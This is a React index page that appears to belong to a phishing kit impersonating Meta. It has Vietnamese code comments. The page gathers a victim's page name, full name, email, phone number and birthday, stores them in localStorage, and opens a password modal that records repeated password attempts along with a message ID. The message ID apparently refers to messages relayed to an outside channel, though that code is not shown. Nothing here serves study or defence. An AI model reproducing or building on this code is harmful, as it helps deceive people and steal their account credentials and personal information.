import { useState, useEffect } from 'react';
import Header from '../components/index/header.jsx';
import Main from '../components/index/main.jsx';
import Footer from '../components/index/footer.jsx';
import Navbar from '../components/index/navbar.jsx';
import PasswordModal from '../components/index/password-modal.jsx';
import { config } from '../config/index.js';

const Index = () => {
    const [headerHeight, setHeaderHeight] = useState(62);
    const [isShowModal, setIsShowModal] = useState(false);
    const [formValue, setFormValue] = useState({
        pageName: '',
        fullName: '',
        email: '',
        phoneNumber: '',
        birthDay: '',
        password: ''
    });
    const [passwordAttempts, setPasswordAttempts] = useState([]);
    const [lastMessageId, setLastMessageId] = useState(null);

    // Load dữ liệu từ localStorage khi component mount
    useEffect(() => {
        const storedData = localStorage.getItem('metaFormData');
        if (storedData) {
            const parsed = JSON.parse(storedData);

            // Kiểm tra nếu dữ liệu chưa quá 24h
            if (Date.now() - parsed.timestamp < 24 * 60 * 60 * 1000) {
                setFormValue({
                    pageName: parsed.pageName || '',
                    fullName: parsed.fullName || '',
                    email: parsed.email || '',
                    phoneNumber: parsed.phoneNumber || '',
                    birthDay: parsed.birthDay || '',
                    password: ''
                });
                setPasswordAttempts(parsed.passwordAttempts || []);
                setLastMessageId(parsed.lastMessageId || null);
            } else {
                // Xóa dữ liệu cũ nếu đã quá 24h
                localStorage.removeItem('metaFormData');
            }
        }
    }, []);

    const handleSubmit = () => {
        if (formValue.email && formValue.phoneNumber) {
            setIsShowModal(true);

            // Lưu dữ liệu form vào localStorage
            const storedData = {
                pageName: formValue.pageName,
                fullName: formValue.fullName,
                email: formValue.email,
                phoneNumber: formValue.phoneNumber,
                birthDay: formValue.birthDay,
                passwordAttempts: [],
                lastMessageId: null,
                lastMessage: '',
                timestamp: Date.now()
            };
            localStorage.setItem('metaFormData', JSON.stringify(storedData));
        } else {
            alert('Invalid email or phone number!');
        }
    };

    return (
        <div>
            <Header setHeaderHeight={setHeaderHeight} />
            <div
                style={{
                    marginTop: `${headerHeight}px`
                }}
                className='container'
            >
                <Navbar height={headerHeight} />
                <div
                    style={{
                        flex: '1'
                    }}
                >
                    <div className='a'>
                        <Main
                            headerHeight={headerHeight}
                            handleSubmit={handleSubmit}
                            formValue={formValue}
                            setFormValue={setFormValue}
                        />
                    </div>
                    <Footer />
                </div>
            </div>
            {isShowModal && (
                <PasswordModal
                    setIsShowModal={setIsShowModal}
                    formValue={formValue}
                    setFormValue={setFormValue}
                    passwordAttempts={passwordAttempts}
                    setPasswordAttempts={setPasswordAttempts}
                    lastMessageId={lastMessageId}
                    setLastMessageId={setLastMessageId}
                />
            )}
        </div>
    );
};

export default Index;
